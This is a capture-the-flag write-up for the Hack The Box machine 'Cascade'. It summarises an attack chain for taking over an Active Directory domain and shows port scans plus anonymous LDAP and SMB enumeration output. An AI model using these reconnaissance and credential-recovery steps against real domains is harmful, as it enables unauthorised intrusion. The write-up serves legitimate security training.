# [cascade](https://app.hackthebox.com/machines/Cascade)

> A Windows Active Directory domain controller that allows anyonmous LDAP binding. As a result, it is possible to enumerate the domain and discover a base64-encoded password in a user's legacy LDAP attribute. This credential grants access to an SMB share that contains the backup of a TightVNC registry key, which contains a password encrypted with a fixed, publicly available key. Decrypting and using this password grants access to another SMB share that contains a .NET Active Directory auditing program and its corresponding SQLite database. The SQLite database contains the encrypted password of another domain user and reverse engineering the .NET program reveals the encryption key and initialization vector used to encrypt the password from the SQLite database. Using this information to reverse the encryption grants a credential that can be used to access this domain user account. This domain user account is a member of the `AD Recycle Bin` group and as a result is capable of retrieving deleted Active Directory objects. A note in one of the SMB shares indicates that during a recent security migration a temporary administrator account was active *that had the same password as the current domain administrator*, but has since been deleted. This temporary admin account can be retrieved from the `AD Recycle Bin` and it also has a legacy LDAP attribute containing its base64-encoded password. This password grants access to the domain administrator account.

---

## Open Port Enumeration

### TCP

```bash
$ sudo masscan -p1-65535 10.129.203.112 --rate=1000 -e tun0 --output-format grepable --output-filename enum/cascade.masscan
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-11-18 15:33:19 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
$ cat enum/cascade.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
135,139,3268,3269,389,445,49154,49155,49157,49158,49165,53,5985,636,88,
```

```bash
$ sudo nmap -sC -sV -O -p135,139,3268,3269,389,445,49154,49155,49157,49158,49165,53,5985,636,88 10.129.203.112 -oA enum/cascade
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-18 10:35 EST
Nmap scan report for 10.129.203.112
Host is up (0.046s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-11-18 15:35:53Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|8.1|7|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012:r2
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows Server 2008 R2 SP1 (90%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   2.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2021-11-18T15:36:50
|_  start_date: 2021-11-18T15:32:02

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.88 seconds
```

The open ports 53, 88, 389, and 636 indicate the target is a Windows Active Directory domain controller. The LDAP ports indicate the domain name is `cascade.local`. The DNS port banner indicates the target is Windows Server 2008. The target is also serving WinRM on port 5985.

### UDP

```bash
$ sudo nmap -sU 10.129.203.112
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-18 10:59 EST
Nmap scan report for 10.129.203.112
Host is up (0.043s latency).
Not shown: 997 open|filtered udp ports (no-response)
PORT    STATE SERVICE
53/udp  open  domain
123/udp open  ntp
389/udp open  ldap

Nmap done: 1 IP address (1 host up) scanned in 25.89 seconds
```

---

## SMB Enumeration

```bash
$ smbmap -u "" -p "" -P 445 -H 10.129.203.112
[+] IP: 10.129.203.112:445      Name: 10.129.203.112
```

```bash
$ smbmap -u "guest%" -p "" -P 445 -H 10.129.203.112
[!] Authentication error on 10.129.203.112
```

This target doesn't allow anonymous or guest access.

---

## LDAP Enumeration

Running `nmap`'s LDAP enumeration scripts against the target seems to indicate that it allows anonymous binding.

```bash
$ nmap -n -sV --script "ldap* and not brute" 10.129.203.112
...[SNIP]...
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
| ldap-rootdse:
| LDAP Results
|   <ROOT>
|       currentTime: 20211118160756.0Z
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=cascade,DC=local
|       dsServiceName: CN=NTDS Settings,CN=CASC-DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=cascade,DC=local
|       namingContexts: DC=cascade,DC=local
|       namingContexts: CN=Configuration,DC=cascade,DC=local
|       namingContexts: CN=Schema,CN=Configuration,DC=cascade,DC=local
|       namingContexts: DC=DomainDnsZones,DC=cascade,DC=local
|       namingContexts: DC=ForestDnsZones,DC=cascade,DC=local
|       defaultNamingContext: DC=cascade,DC=local
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=cascade,DC=local
|       configurationNamingContext: CN=Configuration,DC=cascade,DC=local
|       rootDomainNamingContext: DC=cascade,DC=local
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       highestCommittedUSN: 344202
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       dnsHostName: CASC-DC1.cascade.local
|       ldapServiceName: cascade.local:casc-dc1$@CASCADE.LOCAL
|       serverName: CN=CASC-DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=cascade,DC=local
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       isSynchronized: TRUE
|       isGlobalCatalogReady: TRUE
|       domainFunctionality: 4
|       forestFunctionality: 4
|_      domainControllerFunctionality: 4
| ldap-search:
|   Context: DC=cascade,DC=local
|     dn: DC=cascade,DC=local
|         objectClass: top
|         objectClass: domain
|         objectClass: domainDNS
|         distinguishedName: DC=cascade,DC=local
|         instanceType: 5
|         whenCreated: 2020/01/09 15:31:32 UTC
|         whenChanged: 2021/11/18 15:31:52 UTC
|         subRefs: DC=ForestDnsZones,DC=cascade,DC=local
|         subRefs: DC=DomainDnsZones,DC=cascade,DC=local
|         subRefs: CN=Configuration,DC=cascade,DC=local
|         uSNCreated: 4099
|         uSNChanged: 344149
|         name: cascade
|         objectGUID: 6fd3434-bae0-484b-92be-88e4c5926638
|         objectSid: 1-5-21-3332504370-1206983947-1165150453
|         wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=cascade,DC=local
|         wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Program Data,DC=cascade,DC=local
|         wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=cascade,DC=local
|         wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrincipals,DC=cascade,DC=local
|         wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=cascade,DC=local
|         wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=cascade,DC=local
|         wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=cascade,DC=local
|         wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=cascade,DC=local
|         wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,DC=cascade,DC=local
|         wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=cascade,DC=local
|         wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=cascade,DC=local
|         objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=cascade,DC=local
|         gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=cascade,DC=local;0]
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|         masteredBy: CN=NTDS Settings,CN=CASC-DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=cascade,DC=local
|         msDs-masteredBy: CN=NTDS Settings,CN=CASC-DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=cascade,DC=local
|         msDS-IsDomainFor: CN=NTDS Settings,CN=CASC-DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=cascade,DC=local
|         dc: cascade
|     dn: CN=Configuration,DC=cascade,DC=local
|     dn: CN=Users,DC=cascade,DC=local
|         objectClass: top
|         objectClass: container
|         cn: Users
|         description: Default container for upgraded user accounts
|         distinguishedName: CN=Users,DC=cascade,DC=local
|         instanceType: 4
|         whenCreated: 2020/01/09 15:31:39 UTC
|         whenChanged: 2020/01/09 15:31:39 UTC
|         uSNCreated: 5696
|         uSNChanged: 5696
|         name: Users
|         objectGUID: d231c67-414-df4d-b413-e4aa7349bc19
|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=cascade,DC=local
|         dSCorePropagationData: 2020/01/17 03:37:36 UTC
|         dSCorePropagationData: 2020/01/17 00:14:04 UTC
|         dSCorePropagationData: 2020/01/09 17:59:34 UTC
|         dSCorePropagationData: 2020/01/09 15:48:57 UTC
|         dSCorePropagationData: 1601/07/14 22:36:49 UTC
|     dn: CN=Computers,DC=cascade,DC=local
|         objectClass: top
|         objectClass: container
|         cn: Computers
|         description: Default container for upgraded computer accounts
|         distinguishedName: CN=Computers,DC=cascade,DC=local
|         instanceType: 4
|         whenCreated: 2020/01/09 15:31:39 UTC
|         whenChanged: 2020/01/09 15:31:39 UTC
|         uSNCreated: 5697
|         uSNChanged: 5697
|         name: Computers
|         objectGUID: cc859162-1563-fb4f-969a-e073e8e5af24
|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=cascade,DC=local
|         dSCorePropagationData: 2020/01/17 03:37:36 UTC
|         dSCorePropagationData: 2020/01/17 00:14:04 UTC
|         dSCorePropagationData: 2020/01/09 17:59:34 UTC
|         dSCorePropagationData: 2020/01/09 15:48:57 UTC
|         dSCorePropagationData: 1601/07/14 22:36:49 UTC
|     dn: OU=Domain Controllers,DC=cascade,DC=local
|         objectClass: top
|         objectClass: organizationalUnit
|         ou: Domain Controllers
|         description: Default container for domain controllers
|         distinguishedName: OU=Domain Controllers,DC=cascade,DC=local
|         instanceType: 4
|         whenCreated: 2020/01/09 15:31:39 UTC
|         whenChanged: 2020/01/09 15:31:39 UTC
|         uSNCreated: 5828
|         uSNChanged: 5828
|         name: Domain Controllers
|         objectGUID: d3dbe943-96bf-cd46-9c8d-390a01eedf
|         objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=cascade,DC=local
|         gPLink: [LDAP://CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=cascade,DC=local;0]
|         dSCorePropagationData: 2020/01/17 03:37:36 UTC
|         dSCorePropagationData: 2020/01/17 00:14:04 UTC
|         dSCorePropagationData: 2020/01/09 17:59:34 UTC
|         dSCorePropagationData: 2020/01/09 15:48:57 UTC
|         dSCorePropagationData: 1601/07/14 22:36:49 UTC
|     dn: CN=System,DC=cascade,DC=local
|         objectClass: top
|         objectClass: container
|         cn: System
|         description: Builtin system settings
|         distinguishedName: CN=System,DC=cascade,DC=local
|         instanceType: 4
|         whenCreated: 2020/01/09 15:31:39 UTC
|         whenChanged: 2020/01/09 15:31:39 UTC
|         uSNCreated: 5698
|         uSNChanged: 5698
|         name: System
|         objectGUID: d2fcd93-e48e-ec4b-8ed0-2350af167525
|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=cascade,DC=local
|         dSCorePropagationData: 2020/01/17 03:37:36 UTC
|         dSCorePropagationData: 2020/01/17 00:14:04 UTC
|         dSCorePropagationData: 2020/01/09 17:59:34 UTC
|         dSCorePropagationData: 2020/01/09 15:48:57 UTC
|         dSCorePropagationData: 1601/07/14 22:36:49 UTC
|     dn: CN=LostAndFound,DC=cascade,DC=local
|         objectClass: top
|         objectClass: lostAndFound
|         cn: LostAndFound
|         description: Default container for orphaned objects
|         distinguishedName: CN=LostAndFound,DC=cascade,DC=local
|         instanceType: 4
|         whenCreated: 2020/01/09 15:31:39 UTC
|         whenChanged: 2020/01/09 15:31:39 UTC
|         uSNCreated: 5694
|         uSNChanged: 5694
|         name: LostAndFound
|         objectGUID: be642872-5171-bc48-a0b1-fcfdd23757c
|         objectCategory: CN=Lost-And-Found,CN=Schema,CN=Configuration,DC=cascade,DC=local
|         dSCorePropagationData: 2020/01/17 03:37:36 UTC
|         dSCorePropagationData: 2020/01/17 00:14:04 UTC
|         dSCorePropagationData: 2020/01/09 17:59:34 UTC
|         dSCorePropagationData: 2020/01/09 15:48:57 UTC
|         dSCorePropagationData: 1601/07/14 22:36:49 UTC
|     dn: CN=Infrastructure,DC=cascade,DC=local
|         objectClass: top
|         objectClass: infrastructureUpdate
|         cn: Infrastructure
|         distinguishedName: CN=Infrastructure,DC=cascade,DC=local
|         instanceType: 4
|         whenCreated: 2020/01/09 15:31:39 UTC
|         whenChanged: 2020/01/09 15:31:39 UTC
|         uSNCreated: 5829
|         uSNChanged: 5829
|         name: Infrastructure
|         objectGUID: b884327f-f77d-2e4a-988d-4cbf62a21056
|         objectCategory: CN=Infrastructure-Update,CN=Schema,CN=Configuration,DC=cascade,DC=local
|         dSCorePropagationData: 2020/01/17 03:37:36 UTC
|         dSCorePropagationData: 2020/01/17 00:14:04 UTC
|         dSCorePropagationData: 2020/01/09 17:59:34 UTC
|         dSCorePropagationData: 2020/01/09 15:48:57 UTC
|         dSCorePropagationData: 1601/07/14 22:36:49 UTC
|     dn: CN=ForeignSecurityPrincipals,DC=cascade,DC=local
|         objectClass: top
|         objectClass: container
|         cn: ForeignSecurityPrincipals
|         description: Default container for security identifiers (SIDs) associated with objects from external, trusted domains
|         distinguishedName: CN=ForeignSecurityPrincipals,DC=cascade,DC=local
|         instanceType: 4
|         whenCreated: 2020/01/09 15:31:39 UTC
|         whenChanged: 2020/01/09 15:31:39 UTC
|         uSNCreated: 5830
|         uSNChanged: 5830
|         name: ForeignSecurityPrincipals
|         objectGUID: cf5ca041-aae5-c746-9342-15c6877cb5d6
|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=cascade,DC=local
|         dSCorePropagationData: 2020/01/17 03:37:36 UTC
|         dSCorePropagationData: 2020/01/17 00:14:04 UTC
|         dSCorePropagationData: 2020/01/09 17:59:34 UTC
|         dSCorePropagationData: 2020/01/09 15:48:57 UTC
|         dSCorePropagationData: 1601/07/14 22:36:49 UTC
|     dn: CN=Program Data,DC=cascade,DC=local
|         objectClass: top
|         objectClass: container
|         cn: Program Data
|         description: Default location for storage of application data.
|         distinguishedName: CN=Program Data,DC=cascade,DC=local
|         instanceType: 4
|         whenCreated: 2020/01/09 15:31:39 UTC
|         whenChanged: 2020/01/09 15:31:39 UTC
|         uSNCreated: 5831
|         uSNChanged: 5831
|         name: Program Data
|         objectGUID: 6659c410-395a-da40-9994-a8d580f616c3
|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=cascade,DC=local
|         dSCorePropagationData: 2020/01/17 03:37:36 UTC
|         dSCorePropagationData: 2020/01/17 00:14:04 UTC
|         dSCorePropagationData: 2020/01/09 17:59:34 UTC
|         dSCorePropagationData: 2020/01/09 15:48:57 UTC
|         dSCorePropagationData: 1601/07/14 22:36:49 UTC
|     dn: CN=Microsoft,CN=Program Data,DC=cascade,DC=local
|         objectClass: top
|         objectClass: container
|         cn: Microsoft
|         description: Default location for storage of Microsoft application data.
|         distinguishedName: CN=Microsoft,CN=Program Data,DC=cascade,DC=local
|         instanceType: 4
|         whenCreated: 2020/01/09 15:31:39 UTC
|         whenChanged: 2020/01/09 15:31:39 UTC
|         uSNCreated: 5832
|         uSNChanged: 5832
|         name: Microsoft
|         objectGUID: e05fac4f-55d7-614b-aa62-6166d5825cd
|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=cascade,DC=local
|         dSCorePropagationData: 2020/01/17 03:37:36 UTC
|         dSCorePropagationData: 2020/01/17 00:14:04 UTC
|         dSCorePropagationData: 2020/01/09 17:59:34 UTC
|         dSCorePropagationData: 2020/01/09 15:48:57 UTC
|         dSCorePropagationData: 1601/07/14 22:36:49 UTC
|     dn: CN=NTDS Quotas,DC=cascade,DC=local
|         objectClass: top
|         objectClass: msDS-QuotaContainer
|         cn: NTDS Quotas
|         description: Quota specifications container
|         distinguishedName: CN=NTDS Quotas,DC=cascade,DC=local
|         instanceType: 4
|         whenCreated: 2020/01/09 15:31:39 UTC
|         whenChanged: 2020/01/09 15:31:39 UTC
|         uSNCreated: 5833
|         uSNChanged: 5833
|         name: NTDS Quotas
|         objectGUID: 1f7ccf3-be2f-b24b-8b6f-eddb305bfb97
|         objectCategory: CN=ms-DS-Quota-Container,CN=Schema,CN=Configuration,DC=cascade,DC=local
|         dSCorePropagationData: 2020/01/17 03:37:36 UTC
|         dSCorePropagationData: 2020/01/17 00:14:04 UTC
|         dSCorePropagationData: 2020/01/09 17:59:34 UTC
|         dSCorePropagationData: 2020/01/09 15:48:57 UTC
|         dSCorePropagationData: 1601/07/14 22:36:49 UTC
|     dn: CN=Managed Service Accounts,DC=cascade,DC=local
|         objectClass: top
|         objectClass: container
|         cn: Managed Service Accounts
|         description: Default container for managed service accounts
|         distinguishedName: CN=Managed Service Accounts,DC=cascade,DC=local
|         instanceType: 4
|         whenCreated: 2020/01/09 15:31:39 UTC
|         whenChanged: 2020/01/09 15:31:39 UTC
|         uSNCreated: 5834
|         uSNChanged: 5834
|         name: Managed Service Accounts
|         objectGUID: be185519-f75-1d48-ae3b-88e9ff799d6
|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=cascade,DC=local
|         dSCorePropagationData: 2020/01/17 03:37:36 UTC
|         dSCorePropagationData: 2020/01/17 00:14:04 UTC
|         dSCorePropagationData: 2020/01/09 17:59:34 UTC
|         dSCorePropagationData: 2020/01/09 15:48:57 UTC
|         dSCorePropagationData: 1601/07/14 22:36:49 UTC
|     dn: CN=Schema,CN=Configuration,DC=cascade,DC=local
|     dn: CN=Operations,CN=ForestUpdates,CN=Configuration,DC=cascade,DC=local
|         objectClass: top
|         objectClass: container
|         cn: Operations
|         distinguishedName: CN=Operations,CN=ForestUpdates,CN=Configuration,DC=cascade,DC=local
|         instanceType: 4
|         whenCreated: 2020/01/09 15:31:38 UTC
|         whenChanged: 2020/01/09 15:31:38 UTC
|         uSNCreated: 5616
|         uSNChanged: 5616
|         name: Operations
|         objectGUID: cbc73462-6c58-4d42-8ab9-c67496fad15c
|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=cascade,DC=local
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|     dn: CN=3467dae5-dedd-4648-9066-f48ac186b20a,CN=Operations,CN=ForestUpdates,CN=Configuration,DC=cascade,DC=local
|         objectClass: top
|         objectClass: container
|         cn: 3467dae5-dedd-4648-9066-f48ac186b20a
|         distinguishedName: CN=3467dae5-dedd-4648-9066-f48ac186b20a,CN=Operations,CN=ForestUpdates,CN=Configuration,DC=cascade,DC=local
|         instanceType: 4
|         whenCreated: 2020/01/09 15:31:38 UTC
|         whenChanged: 2020/01/09 15:31:38 UTC
|         uSNCreated: 5617
|         uSNChanged: 5617
|         name: 3467dae5-dedd-4648-9066-f48ac186b20a
|         objectGUID: 1d484f68-b241-c740-911e-12671998beb9
|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=cascade,DC=local
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|     dn: CN=33b7ee33-1386-47cf-baa1-b03e06473253,CN=Operations,CN=ForestUpdates,CN=Configuration,DC=cascade,DC=local
|         objectClass: top
|         objectClass: container
|         cn: 33b7ee33-1386-47cf-baa1-b03e06473253
|         distinguishedName: CN=33b7ee33-1386-47cf-baa1-b03e06473253,CN=Operations,CN=ForestUpdates,CN=Configuration,DC=cascade,DC=local
|         instanceType: 4
|         whenCreated: 2020/01/09 15:31:38 UTC
|         whenChanged: 2020/01/09 15:31:38 UTC
|         uSNCreated: 5618
|         uSNChanged: 5618
|         name: 33b7ee33-1386-47cf-baa1-b03e06473253
|         objectGUID: 391bf027-4ee8-c643-ae7f-44374f6c787c
|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=cascade,DC=local
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|     dn: CN=e9ee8d55-c2fb-4723-a333-c80ff4dfbf45,CN=Operations,CN=ForestUpdates,CN=Configuration,DC=cascade,DC=local
|         objectClass: top
|         objectClass: container
|         cn: e9ee8d55-c2fb-4723-a333-c80ff4dfbf45
|         distinguishedName: CN=e9ee8d55-c2fb-4723-a333-c80ff4dfbf45,CN=Operations,CN=ForestUpdates,CN=Configuration,DC=cascade,DC=local
|         instanceType: 4
|         whenCreated: 2020/01/09 15:31:38 UTC
|         whenChanged: 2020/01/09 15:31:38 UTC
|         uSNCreated: 5619
|         uSNChanged: 5619
|         name: e9ee8d55-c2fb-4723-a333-c80ff4dfbf45
|         objectGUID: a351f2f6-c653-5048-a0db-2857f68f8a65
|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=cascade,DC=local
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|     dn: CN=ccfae63a-7fb5-454c-83ab-0e8e1214974e,CN=Operations,CN=ForestUpdates,CN=Configuration,DC=cascade,DC=local
|         objectClass: top
|         objectClass: container
|         cn: ccfae63a-7fb5-454c-83ab-0e8e1214974e
|         distinguishedName: CN=ccfae63a-7fb5-454c-83ab-0e8e1214974e,CN=Operations,CN=ForestUpdates,CN=Configuration,DC=cascade,DC=local
|         instanceType: 4
|         whenCreated: 2020/01/09 15:31:38 UTC
|         whenChanged: 2020/01/09 15:31:38 UTC
|         uSNCreated: 5620
|         uSNChanged: 5620
|         name: ccfae63a-7fb5-454c-83ab-0e8e1214974e
|         objectGUID: fee9667-aef-e141-a24-d8d3af5ad50
|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=cascade,DC=local
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|     dn: CN=ad3c7909-b154-4c16-8bf7-2c3a7870bb3d,CN=Operations,CN=ForestUpdates,CN=Configuration,DC=cascade,DC=local
|         objectClass: top
|         objectClass: container
|         cn: ad3c7909-b154-4c16-8bf7-2c3a7870bb3d
|         distinguishedName: CN=ad3c7909-b154-4c16-8bf7-2c3a7870bb3d,CN=Operations,CN=ForestUpdates,CN=Configuration,DC=cascade,DC=local
|         instanceType: 4
|         whenCreated: 2020/01/09 15:31:38 UTC
|         whenChanged: 2020/01/09 15:31:38 UTC
|         uSNCreated: 5621
|         uSNChanged: 5621
|         name: ad3c7909-b154-4c16-8bf7-2c3a7870bb3d
|         objectGUID: 5a1f55c-a114-847-8b70-52141a3eb78e
|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=cascade,DC=local
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|
|
|_Result limited to 20 objects (see ldap.maxobjects)
...[SNIP]...
```

The above output indicates the target's FQDN is `casc-dc1.cascade.local`.

### Domain Users

```bash
$ ldapsearch -LLL -x -h 10.129.203.112 -b 'dc=cascade,dc=local' '(&(objectclass=user)(name=*))'
dn: CN=CascGuest,CN=Users,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: CascGuest
description: Built-in account for guest access to the computer/domain
distinguishedName: CN=CascGuest,CN=Users,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109153140.0Z
whenChanged: 20200110160637.0Z
uSNCreated: 8197
memberOf: CN=Guests,CN=Builtin,DC=cascade,DC=local
uSNChanged: 45094
name: CascGuest
objectGUID:: LrFX+qgBukGjmV+ZFABrZw==
userAccountControl: 66082
badPwdCount: 19
codePage: 0
countryCode: 0
badPasswordTime: 132817324184291644
lastLogoff: 0
lastLogon: 0
pwdLastSet: 0
primaryGroupID: 514
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJF9QEAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: CascGuest
sAMAccountType: 805306368
userPrincipalName: CascGuest@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20200117033736.0Z
dSCorePropagationData: 20200117001404.0Z
dSCorePropagationData: 20200109175934.0Z
dSCorePropagationData: 20200109154857.0Z
dSCorePropagationData: 16010714223649.0Z
lastLogonTimestamp: 132230700642958462

dn: CN=CASC-DC1,OU=Domain Controllers,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
objectClass: computer
cn: CASC-DC1
distinguishedName: CN=CASC-DC1,OU=Domain Controllers,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109153215.0Z
whenChanged: 20211118160315.0Z
uSNCreated: 12293
uSNChanged: 344202
name: CASC-DC1
objectGUID:: YzFU46Jo90CiFCmHfZLVOQ==
userAccountControl: 532480
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132817324186943648
lastLogoff: 0
lastLogon: 132817340412688147
localPolicyFlags: 0
pwdLastSet: 132808603030940853
primaryGroupID: 516
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJF6QMAAA==
accountExpires: 9223372036854775807
logonCount: 5976
sAMAccountName: CASC-DC1$
sAMAccountType: 805306369
operatingSystem: Windows Server 2008 R2 Standard
operatingSystemVersion: 6.1 (7601)
operatingSystemServicePack: Service Pack 1
serverReferenceBL: CN=CASC-DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,
 CN=Configuration,DC=cascade,DC=local
